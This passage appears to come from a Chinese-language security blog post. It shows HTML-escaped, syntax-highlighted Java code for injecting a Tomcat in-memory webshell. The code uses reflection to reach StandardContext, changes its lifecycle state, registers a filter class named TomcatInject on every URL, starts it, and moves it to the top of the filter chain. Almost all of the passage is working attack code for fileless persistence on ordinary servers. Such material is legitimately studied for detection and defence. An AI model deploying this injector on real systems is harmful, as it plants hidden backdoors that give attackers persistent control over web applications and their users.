&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// 设置ThreadLocal对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取上下文StandardContext
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getServletContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;context&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ApplicationContext&lt;/span> &lt;span style="color:#111">appctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ApplicationContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">stdctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">appctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;context&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stdctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StandardContext&lt;/span> &lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">stdctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">appctx&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这样设置不会抛出报错
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">stateField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">catalina&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">LifecycleBase&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;state&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">LifecycleState&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">STARTING_PREP&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Filter&lt;/span> &lt;span style="color:#111">myFilter&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TomcatInject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 调用doFilter来动态添加Filter 也可以利用反射
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">javax&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FilterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Dynamic&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span> &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">filterName&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">myFilter&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 进行一些简单的设置
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInitParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAsyncSupported&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置基本的 url pattern
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addMappingForUrlPatterns&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EnumSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javax&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">DispatcherType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">REQUEST&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将服务重新修改回来，不然的话服务会无法正常进行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stateField&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">catalina&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">LifecycleState&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">STARTED&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置好之后调用filterstart来启动我们的 filter
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">filterStartMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">StandardContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;filterStart&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterStartMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterStartMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 把filter插到第一位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.tomcat.util.descriptor.web.FilterMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.deploy.FilterMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.StandardContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;findFilterMaps&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">tmpFilterMaps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ccc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getFilterName&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">filterName&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">++]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// e.printStackTrace();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#75af00">getServletContext&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NoSuchFieldException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IllegalAccessException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationFilterChain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
